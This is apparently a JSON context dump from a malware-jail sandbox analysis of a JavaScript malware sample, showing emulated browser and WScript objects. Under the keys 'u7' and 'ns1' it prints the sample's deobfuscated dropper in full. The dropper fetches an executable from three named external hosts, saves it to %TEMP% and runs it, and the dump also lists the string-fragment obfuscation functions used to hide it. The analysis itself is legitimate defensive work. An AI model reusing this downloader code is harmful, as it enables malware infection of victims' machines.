{\n                            path = item.$ref;\n                            if (typeof path === 'string' && px.test(path)) {\n                                value[i] = eval(path);\n                            } else {\n                                rez(item);\n                            }\n                        }\n                    }\n                } else {\n                    for (name in value) {\n                        if (typeof value[name] === 'object') {\n                            item = value[name];\n                            if (item) {\n                                path = item.$ref;\n                                if (typeof path === 'string' && px.test(path)) {\n                                    value[name] = eval(path);\n                                } else {\n                                    rez(item);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }($));\n        return $;\n    }"
            },
            "Function": "function Function() { [native code] }",
            "Element": "Element",
            "HTMLElement": "HTMLElement",
            "_props": {
                "_browser_type": "IE8 on Win10 64bit",
                "userAgent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/7.0; Touch; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)"
            },
            "appVersion": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/7.0; Touch; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)"
        },
        "_location": {
            "$ref": "$[\"location\"]"
        },
        "toString": "() => { return \"window\" }",
        "Array": "function Array() { [native code] }",
        "Boolean": "function Boolean() { [native code] }",
        "Date": "function Date() { [native code] }",
        "Error": "function Error() { [native code] }",
        "Math": {
            "$ref": "$[\"window\"][\"navigator\"][\"Math\"]"
        },
        "Number": "function Number() { [native code] }",
        "Object": "function Object() { [native code] }",
        "RegExp": "function RegExp() { [native code] }",
        "String": "function String() { [native code] }",
        "Node": "Node",
        "JSON": {
            "$ref": "$[\"window\"][\"navigator\"][\"JSON\"]"
        },
        "Function": "function Function() { [native code] }",
        "Element": "Element",
        "HTMLElement": "HTMLElement",
        "_props": {
            "$ref": "$[\"window\"][\"navigator\"][\"_props\"]"
        },
        "appVersion": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/7.0; Touch; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)"
    },
    "setTimeout": "function () { [native code] }",
    "setInterval": "function () { [native code] }",
    "clearInterval": "function () { [native code] }",
    "clearTimeout": "function () { [native code] }",
    "navigator": {
        "$ref": "$[\"window\"]"
    },
    "Document": "Document",
    "document": {
        "id": 6,
        "_name": "document[6]",
        "_content": "",
        "_elements": [
            {
                "_id": 7,
                "_name": "Element[7]<html>",
                "_innerHTML": "",
                "_outerHTML": "",
                "_text": "",
                "_children": [
                    {
                        "_id": 11,
                        "_name": "Element[11]<head>",
                        "_innerHTML": "",
                        "_outerHTML": "",
                        "_text": "",
                        "_children": [],
                        "_attributes": [],
                        "_class": "",
                        "__vgRuntimeStyle": "",
                        "_nodename": "head",
                        "toString": "function () {\n        return this._name;\n    }",
                        "appendchild": "function (e) {\n        util_log(this._name + \".appendChild(\" + e._name + \")\");\n        if (this._children.length == 0) {\n            this.firstChild = e;\n        }\n        this._children[this._children.length] = e;\n        e.parentNode = this;\n        e.parentelement = this;\n        return e;\n    }",
                        "removechild": "function (e) {\n        util_log(this._name + \".removeChild(\" + e._name + \") - dummy\");\n        return e;\n    }",
                        "setattribute": "function (n, v) {\n        util_log(this._name + \".setAttribute(\" + n + \", \" + v + \")\");\n        this._attributes[n] = v;\n    }",
                        "_firstchild": "",
                        "_parentelement": {
                            "$ref": "$[\"document\"][\"_elements\"][0]"
                        },
                        "_parentnode": {
                            "$ref": "$[\"document\"][\"_elements\"][0]"
                        },
                        "_style": {
                            "_id": 12,
                            "_name": "Style[12]",
                            "_attributes": {
                                "visibility": true,
                                "left": 0,
                                "top": 0,
                                "position": "",
                                "stylesheet": {
                                    "cssText": ""
                                }
                            },
                            "tostring": "() => {\n        return this._name;\n    }",
                            "toString": "() => {\n        return this._name;\n    }"
                        }
                    },
                    {
                        "_id": 9,
                        "_name": "Element[9]<body>",
                        "_innerHTML": "",
                        "_outerHTML": "",
                        "_text": "",
                        "_children": [],
                        "_attributes": [],
                        "_class": "",
                        "__vgRuntimeStyle": "",
                        "_nodename": "body",
                        "toString": "function () {\n        return this._name;\n    }",
                        "appendchild": "function (e) {\n        util_log(this._name + \".appendChild(\" + e._name + \")\");\n        if (this._children.length == 0) {\n            this.firstChild = e;\n        }\n        this._children[this._children.length] = e;\n        e.parentNode = this;\n        e.parentelement = this;\n        return e;\n    }",
                        "removechild": "function (e) {\n        util_log(this._name + \".removeChild(\" + e._name + \") - dummy\");\n        return e;\n    }",
                        "setattribute": "function (n, v) {\n        util_log(this._name + \".setAttribute(\" + n + \", \" + v + \")\");\n        this._attributes[n] = v;\n    }",
                        "_firstchild": "",
                        "_parentelement": {
                            "$ref": "$[\"document\"][\"_elements\"][0]"
                        },
                        "_parentnode": {
                            "$ref": "$[\"document\"][\"_elements\"][0]"
                        },
                        "_style": {
                            "_id": 10,
                            "_name": "Style[10]",
                            "_attributes": {
                                "visibility": true,
                                "left": 0,
                                "top": 0,
                                "position": "",
                                "stylesheet": {
                                    "cssText": ""
                                }
                            },
                            "tostring": "() => {\n        return this._name;\n    }",
                            "toString": "() => {\n        return this._name;\n    }"
                        }
                    }
                ],
                "_attributes": [],
                "_class": "",
                "__vgRuntimeStyle": "",
                "_nodename": "html",
                "toString": "function () {\n        return this._name;\n    }",
                "appendchild": "function (e) {\n        util_log(this._name + \".appendChild(\" + e._name + \")\");\n        if (this._children.length == 0) {\n            this.firstChild = e;\n        }\n        this._children[this._children.length] = e;\n        e.parentNode = this;\n        e.parentelement = this;\n        return e;\n    }",
                "removechild": "function (e) {\n        util_log(this._name + \".removeChild(\" + e._name + \") - dummy\");\n        return e;\n    }",
                "setattribute": "function (n, v) {\n        util_log(this._name + \".setAttribute(\" + n + \", \" + v + \")\");\n        this._attributes[n] = v;\n    }",
                "_firstchild": {
                    "$ref": "$[\"document\"][\"_elements\"][0][\"_children\"][0]"
                },
                "_parentelement": "",
                "_parentnode": "",
                "_style": {
                    "_id": 8,
                    "_name": "Style[8]",
                    "_attributes": {
                        "visibility": true,
                        "left": 0,
                        "top": 0,
                        "position": "",
                        "stylesheet": {
                            "cssText": ""
                        }
                    },
                    "tostring": "() => {\n        return this._name;\n    }",
                    "toString": "() => {\n        return this._name;\n    }"
                }
            },
            {
                "$ref": "$[\"document\"][\"_elements\"][0][\"_children\"][1]"
            },
            {
                "$ref": "$[\"document\"][\"_elements\"][0][\"_children\"][0]"
            }
        ],
        "getelementsbytagname": "function (n) {\n        var ret = []\n        util_log(this._name + \".getElementsByTagName(\" + n + \")\");\n        for(i = 0; i < this._elements.length; i++) {\n            var e = this._elements[i];\n            if (e.elementName.toLowerCase() === n.toLowerCase()) {\n                ret[ret.length] = e;\n            }\n        }\n        util_log(this._name + \".getElementsByTagName(\" + n + \") ... \" + ret.length + \" found\");\n        return ret;\n    }",
        "getelementsbyclassname": "function (n) {\n        var ret = []\n        util_log(this._name + \".getElementsByClassName(\" + n + \")\");\n        for(i = 0; i < this._elements.length; i++) {\n            var e = this._elements[i];\n            if (e.class.toLowerCase() === n.toLowerCase()) {\n                ret[ret.length] = e;\n            }\n        }\n        util_log(this._name + \".getElementsByClassName(\" + n + \") ... \" + ret.length + \" found\");\n        return ret;\n    }",
        "getelementbyid": "function (n) {\n        util_log(this._name + \".getElementById(\" + n + \")\");\n        for(i = 0; i < this._elements.length; i++) {\n            var e = this._elements[i];\n            if ((\"\"+ e._id).toLowerCase() === n.toLowerCase()) {\n                util_log(this._name + \".getElementById(\" + n + \") => \" + e._name);\n                return e;\n            }\n        }\n        util_log(this._name + \".getElementById(\" + n + \") => null\");\n        return null;\n    }",
        "createelement": "function (n) {\n        util_log(this._name + \".createElement(\" + n + \")\");\n        var e;\n        if (n.toLowerCase() === \"iframe\") {\n            e = new HTMLIFrameElement();\n        } else if (n.toLowerCase() === \"style\") {\n            e = new Style();\n        } else {\n            e = new Element(n);\n        }\n        this._elements[this._elements.length] = e;\n        return e;\n    }",
        "createtextnode": "function (n) {\n        util_log(this._name + \".createTextNode(\" + n + \")\");\n        return new Element(n);\n    }",
        "createstylesheet": "function (n) {\n        util_log(this._name + \".createStyleSheet(\" + n + \")\");\n        return this.createelement(\"style\");\n    }",
        "write": "function (c) {\n        util_log(this._name + \".write(content) \" + c.length + \" bytes\");\n        util_log(\"=> '\" + c + \"'\");\n        _content = c;\n        _browser_documents[_browser_documents.length] = c;\n    }",
        "writeln": "function (c) {\n        util_log(this._name + \".writeln(content) \" + c.length + \" bytes\");\n        util_log(\"=> '\" + c + \"'\");\n        _content = c;\n        _browser_documents[_browser_documents.length] = c;\n    }",
        "_addElementById": "function (id, content) {\n        var e = new Element(\"div\");\n        e.id = _object_id;\n        e.innerHTML = content;\n        this._elements[this._elements.length] = e;\n    }",
        "_addElementByClass": "function (cls, content) {\n        var e = new Element(\"div\");\n        e.class = cls;\n        e.innerHTML = content;\n        this._elements[this._elements.length] = e;\n    }",
        "_props": {
            "body": {
                "$ref": "$[\"document\"][\"_elements\"][0][\"_children\"][1]"
            },
            "referrer": "http://example.com/",
            "cookie": "",
            "namespaces": {
                "id": 13,
                "_name": "Collection[13]",
                "_items": [],
                "add": "function (a) {\n        util_log(this._name + \".add(\" + a + \")\");\n        this._items[this._items.length] = a;\n    }",
                "toString": "function () {\n        return this._name;\n    }"
            }
        },
        "_location": {
            "$ref": "$[\"location\"]"
        },
        "documentelement": {
            "$ref": "$[\"document\"][\"_elements\"][0]"
        },
        "head": {
            "$ref": "$[\"document\"][\"_elements\"][0][\"_children\"][0]"
        },
        "toString": "() => { return \"document\" }"
    },
    "Image": "function (w, h) {\n    Element.call(this, \"Image\");\n    util_log(\"Image(\" + w + \", \" + h + \")\");\n\n    this._width = w;\n    this._height = h;\n    _defineSingleProperty(this, \"width\", \"_width\");\n    _defineSingleProperty(this, \"height\", \"_height\");\n}",
    "_agents": {
        "IE11_W10": {
            "_browser_type": "IE11 on Win10 64bit",
            "userAgent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; rv:11.0) like Gecko",
            "vendor": ""
        },
        "IE8": {
            "$ref": "$[\"window\"][\"navigator\"][\"_props\"]"
        },
        "IE7": {
            "_browser_type": "IE7 on Vista",
            "userAgent": "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; en-US)"
        },
        "iPhone": {
            "_browser_type": "iPhone?",
            "userAgent": "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/47.0.2526.70 Mobile/12B436 Safari/600.1.4 (000410)",
            "vendor": "Apple"
        },
        "Firefox": {
            "_browser_type": "Firefox on Win10 64bit",
            "userAgent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0",
            "vendor": ""
        },
        "Chrome": {
            "_browser_type": "Chrome on Win10 64bit",
            "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36",
            "chrome": {
                "app": {},
                "csi": "function () {}",
                "loadTimes": "function () {}",
                "runtime": {},
                "webstore": {}
            },
            "vendor": "Google Inc."
        }
    },
    "_unescape_calls": [],
    "_unescape_retuns": [],
    "_orig_unescape": "_orig_unescape",
    "unescape": "unescape",
    "str": "5552505E160B0601161017241605070F17140507014A070B095E3C5E060A1E4A070B094A091D5E17555E555050525C50505555505E55",
    "u7": "var b = \"kennedy.sitoserver.com nzvincent.com abama.org\".split(\" \"); var ws = WScript.CreateObject(\"WScript.Shell\"); var fn = ws.ExpandEnvironmentStrings(\"%TEMP%\")+String.fromCharCode(92)+\"799755\"; var xo = WScript.CreateObject(\"MSXML2.XMLHTTP\"); var xa = WScript.CreateObject(\"ADODB.Stream\"); var ld = 0; for (var n=1; n<=3; n++) { for (var i=ld; i<b.length; i++) { var dn = 0; try { xo.open(\"GET\",\"http://\"+b[i]+\"/counter/?id=\"+str+\"&rnd=309034\"+n, false); xo.send(); if (xo.status == 200) { xa.open(); xa.type = 1; xa.write(xo.responseBody); if (xa.size > 1000) { dn = 1; xa.position = 0; xa.saveToFile(fn+n+\".exe\",2); try { ws.Run(fn+n+\".exe\",1,0); } catch (er) { }; }; xa.close(); }; if (dn == 1) { ld = i; break; }; } catch (er) { }; }; };",
    "ns1": "var b = \"kennedy.sitoserver.com nzvincent.com abama.org\".split(\" \"); var ws = WScript.CreateObject(\"WScript.Shell\"); var fn = ws.ExpandEnvironmentStrings(\"%TEMP%\")+String.fromCharCode(92)+\"799755\"; var xo = WScript.CreateObject(\"MSXML2.XMLHTTP\"); var xa = WScript.CreateObject(\"ADODB.Stream\"); var ld = 0; for (var n=1; n<=3; n++) { for (var i=ld; i<b.length; i++) { var dn = 0; try { xo.open(\"GET\",\"http://\"+b[i]+\"/counter/?id=\"+str+\"&rnd=309034\"+n, false); xo.send(); if (xo.status == 200) { xa.open(); xa.type = 1; xa.write(xo.responseBody); if (xa.size > 1000) { dn = 1; xa.position = 0; xa.saveToFile(fn+n+\".exe\",2); try { ws.Run(fn+n+\".exe\",1,0); } catch(er) { util_log(\">>> Silencing catch \" + _inspect(er)); }; }; xa.close(); }; if (dn == 1) { ld = i; break; }; } catch(er) { util_log(\">>> Silencing catch \" + _inspect(er)); }; }; };",
    "b": [
        "kennedy.sitoserver.com",
        "nzvincent.com",
        "abama.org"
    ],
    "ws": {
        "$ref": "$[\"_wscript_objects\"][0]"
    },
    "fn": "C:\\Users\\User\\AppData\\Local\\Temp\\799755",
    "xo": {
        "$ref": "$[\"_wscript_objects\"][1]"
    },
    "xa": {
        "$ref": "$[\"_wscript_objects\"][2]"
    },
    "ld": 0,
    "n": 4,
    "i": 3,
    "dn": 0,
    "b8": "function b8(){return '+Stri';}",
    "l0": "function l0(){return 'r (var ';}",
    "e8": "function e8(){return 'MP%\")';}",
    "l1": "function l1(){return 'nmentS';}",
    "z4": "function z4(){return 'm aba';}",
    "q3": "function q3(){return '5\"; va';}",
    "n4": "function n4(){return 'B.Str';}",
    "p2": "function p2(){return '}; };';}",
    "c5": "function c5(){return 'o.send(';}",
    "z6": "function z6(){return 'r) { ';}",
    "b9": "function b9(){return 'com nz';}",
    "s3": "function s3(){return '\".exe\"';}",
    "a0": "function a0(){return '.size >';}",
    "i6": "function i6(){return 'T\",\"ht';}",
    "q1": "function q1(){return '(xo.st';}",
    "m3": "function m3(){return '= \"ken';}",
    "g0": "function g0(){return '(xo.re';}",
    "i4": "function i4(){return 'nter/?';}",
    "r4": "function r4(){return ' }; };';}",
    "j5": "function j5(){return '+) { ';}",
    "d6": "function d6(){return ',1,0);';}",
    "x7": "function x7(){return '.saveTo';}",
    "x0": "function x0(){return ' 1000)';}",
    "g9": "function g9(){return '79975';}",
    "m0": "function m0(){return 'i=ld; i';}",
    "b0": "function b0(){return 'teObj';}",
    "c3": "function c3(){return 'teObje';}",
    "x5": "function x5(){return 'tch (';}",
    "e1": "function e1(){return 't.Crea';}",
    "l6": "function l6(){return 'fn+n+\".';}",
    "g8": "function g8(){return 'nedy.';}",
    "b3": "function b3(){return '; try ';}",
    "d0": "function d0(){return '92)+\"';}",
    "k7": "function k7(){return 'rCode(';}",
    "u8": "function u8(){return ' (var ';}",
    "t4": "function t4(){return '}; if';}",
    "v6": "function v6(){return 'n=1; n';}",
    "f0": "function f0(){return '<b.len';}",
    "a3": "function a3(){return '= 200)';}",
    "j6": "function j6(){return '\".spl';}",
    "s9": "function s9(){return 'r xo =';}",
    "e0": "function e0(){return 'Shell';}",
    "l5": "function l5(){return 'eak; }';}",
    "z3": "function z3(){return '{ ws.Ru';}",
    "c0": "function c0(){return '<=3; n+';}",
    "a1": "function a1(){return 'Object(';}",
    "j9": "function j9(){return ' if (xa';}",
    "o9": "function o9(){return 'e); x';}",
    "h3": "function h3(){return ' = 1; x';}",
    "n3": "function n3(){return ' } ca';}",
    "f9": "function f9(){return 'ng.fr';}",
    "k6": "function k6(){return 'n(fn+n+';}",
    "f6": "function f6(){return ' = ws.E';}",
    "z8": "function z8(){return ' i; br';}",
    "h8": "function h8(){return '34\"+n';}",
    "n0": "function n0(){return '.Crea';}",
    "k4": "function k4(){return 'Enviro';}",
    "p5": "function p5(){return 'write';}",
    "u5": "function u5(){return 'ld = 0';}",
    "j0": "function j0(){return 'spons';}",
    "f8": "function f8(){return '(\"%TE';}",
    "i8": "function i8(){return '; } ca';}",
    "t6": "function t6(){return 'ript.';}",
    "h2": "function h2(){return ' ws = ';}",
    "t0": "function t0(){return 'xpand';}",
    "d8": "function d8(){return 'File(';}",
    "b6": "function b6(){return 'trings';}",
    "s2": "function s2(){return '\"); v';}",
    "d3": "function d3(){return '\"); va';}",
    "l8": "function l8(){return 'open();';}",
    "f2": "function f2(){return ', fals';}",
    "s7": "function s7(){return 'gth; i+';}",
    "d7": "function d7(){return 'ct(\"WS';}",
    "o1": "function o1(){return 'sitose';}",
    "o4": "function o4(){return ' xo.ope';}",
    "i7": "function i7(){return '+) { fo';}",
    "w1": "function w1(){return '\"/cou';}",
    "p3": "function p3(){return 'var d';}",
    "i1": "function i1(){return 'eBody);';}",
    "h9": "function h9(){return 'try {';}",
    "h0": "function h0(){return '; var ';}",
    "k1": "function k1(){return '1; xa.';}",
    "c4": "function c4(){return 'it(\" ';}",
    "k2": "function k2(){return 'r xa ';}",
    "e2": "function e2(){return 'ion = ';}",
    "n2": "function n2(){return 'omCha';}",
    "e7": "function e7(){return '= WSc';}",
    "a2": "function a2(){return ' (dn ';}",
    "r2": "function r2(){return 'se(); ';}",
    "u2": "function u2(){return 'WScript';}",
    "p8": "function p8(){return 'ar fn';}",
    "p6": "function p6(){return ' { ld =';}",
    "k0": "function k0(){return '; for';}",
    "d2": "function d2(){return 'd=3090';}",
    "n8": "function n8(){return 'rver.';}",
    "a9": "function a9(){return '\"ADOD';}",
    "q5": "function q5(){return '+b[i]+';}",
    "u1": "function u1(){return ' WScrip';}",
    "y9": "function y9(){return 'id=\"+s';}",
    "g2": "function g2(){return ' };';}",
    "x4": "function x4(){return 'er) {';}",
    "j3": "function j3(){return 'a.posit';}",
    "p0": "function p0(){return 'Create';}",
    "l2": "function l2(){return 'ma.org';}",
    "z2": "function z2(){return 'vince';}",
    "m4": "function m4(){return ' xa.clo';}",
    "r7": "function r7(){return 'exe\",2)';}",
    "m8": "function m8(){return '== 1)';}",
    "l4": "function l4(){return 'cript.';}",
    "g1": "function g1(){return ' { xa.';}",
    "t7": "function t7(){return 'tr+\"&rn';}",
    "b4": "function b4(){return '\"); var';}",
    "j4": "function j4(){return 'XMLHTTP';}",
    "b1": "function b1(){return 'ype = ';}",
    "w0": "function w0(){return eval;}",
    "l7": "function l7(){return '0; xa';}",
    "f5": "function f5(){return 'n(\"GE';}",
    "a8": "function a8(){return 'ect(\"';}",
    "o0": "function o0(){return '); if ';}",
    "t1": "function t1(){return 'var b ';}",
    "u3": "function u3(){return 'tp://\"';}",
    "y0": "function y0(){return 'eam\")';}",
    "y8": "function y8(){return ' xa.t';}",
    "r9": "function r9(){return 'tch (e';}",
    "w8": "function w8(){return 'nt.co';}",
    "h6": "function h6(){return 'atus =';}",
    "c6": "function c6(){return ' { dn';}",
    "t8": "function t8(){return 'MSXML2.';}",
    "f4": "function f4(){return 'n = 0; ';}",
    "_config": {
        "sandbox_sequence1": [
            "fame/modules/community/processing/malware_jail/malware-jail/env/eval.js",
            "fame/modules/community/processing/malware_jail/malware-jail/env/wscript.js"
        ],
        "sandbox_sequence": [
            "fame/modules/community/processing/malware_jail/malware-jail/env/utils.js",
            "fame/modules/community/processing/malware_jail/malware-jail/env/eval.js",
            "fame/modules/community/processing/malware_jail/malware-jail/env/function.js",
            "fame/modules/community/processing/malware_jail/malware-jail/env/wscript.js",
            "fame/modules/community/processing/malware_jail/malware-jail/env/browser.js",
            "fame/modules/community/processing/malware_jail/malware-jail/env/agents.js",
            "fame/modules/community/processing/malware_jail/malware-jail/env/other.js",
            "fame/modules/community/processing/malware_jail/malware-jail/env/console.js"
        ],
        "browser_type": "IE8",
        "malware_files": [
            "/home/maik/gitHub/TFM/fame/storage/c410086a1075dc1210aa7e2ff8f3040d860ca7c98e8805ff5e29b4c1617cbce4/c410086a1075dc1210aa7e2ff8f3040d860ca7c98e8805ff5e29b4c1617cbce4.js"
        ],
        "context_dump_after": "fame/modules/community/processing/malware_jail/malware-jail/sandbox_dump_after.json",
        "save_files": "fame/modules/community/processing/malware_jail/malware-jail/output/",
        "timeout": 60000
    },
    "_arguments": "--down /home/maik/gitHub/TFM/fame/storage/c410086a1075dc1210aa7e2ff8f3040d860ca7c98e8805ff5e29b4c1617cbce4/c410086a1075dc1210aa7e2ff8f3040d860ca7c98e8805ff5e29b4c1617cbce4.js"
}